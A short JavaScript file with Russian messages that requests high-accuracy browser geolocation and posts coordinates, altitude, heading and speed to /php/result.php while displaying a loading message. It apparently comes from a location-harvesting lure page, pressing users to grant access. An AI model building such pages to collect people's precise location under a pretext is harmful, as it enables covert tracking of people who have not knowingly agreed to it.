function locate()
{
  if(navigator.geolocation)
  {
    var optn = {enableHighAccuracy : true, timeout : 30000, maximumage: 0};
    navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
  }
  else
  {
    alert('Функция определения местоположения не поддерживается вашим браузером...');
  }

  function showPosition(position)
  {
    var lat = position.coords.latitude;
    var lon = position.coords.longitude;
    var acc = position.coords.accuracy;
    var alt = position.coords.altitude;
    var dir = position.coords.heading;
    var spd = position.coords.speed;

    $.ajax({
      type: 'POST',
      url: '/php/result.php',
      data: {Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd},
      success: function(){$('#change').html('Загрузка. Пожалуйста, подождите...');},
      mimeType: 'text'
    });
  };
}

function showError(error)
{
	switch(error.code)
  {
		case error.PERMISSION_DENIED:
			var denied = 'Пользователь отклонил запрос на геолокацию';
      alert('Для корректной работы сервиса, пожалуйста, предоставите доступ к местоположению');
      break;
		case error.POSITION_UNAVAILABLE:
			var unavailable = 'Информация о местоположении недоступна';
			break;
		case error.TIMEOUT:
			var timeout = 'Время ожидания запроса на получение местоположения пользователя истекло';
      alert('Please Set Your Location Mode on High Accuracy...');
			break;
		case error.UNKNOWN_ERROR:
			var unknown = 'Произошла неизвестная ошибка';
			break;
	}

  $.ajax({
    type: 'POST',
    url: '/php/error.php',
    data: {Denied: denied, Una: unavailable, Time: timeout, Unk: unknown},
    success: function(){$('#change').html('Активируйте местоположение');},
    mimeType: 'text'
  });
}
